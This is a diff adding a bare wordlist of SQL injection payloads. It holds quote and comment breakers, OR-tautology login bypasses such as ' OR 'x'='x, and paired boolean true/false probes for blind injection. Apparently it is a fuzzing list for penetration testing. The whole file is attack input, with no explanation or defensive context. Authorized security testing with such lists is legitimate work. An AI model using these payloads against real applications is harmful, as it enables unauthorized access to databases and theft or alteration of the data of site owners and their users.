@@ -1,0 +1,45 @@
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or "
+-- or # 
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+OR 1=1
+ OR 1=0
+ OR x=x
+ OR x=y
+ OR 1=1#
+ OR 1=0#
+ OR x=x#
+ OR x=y#
+ OR 1=1-- 
+ OR 1=0-- 
+ OR x=x-- 
+ OR x=y-- 
+ OR 3409=3409 AND ('pytW' LIKE 'pytW
+ OR 3409=3409 AND ('pytW' LIKE 'pytY
+ AND 1=1
+ AND 1=0
+ AND 1=1-- 
+ AND 1=0-- 
+ AND 1=1#
+ AND 1=0#
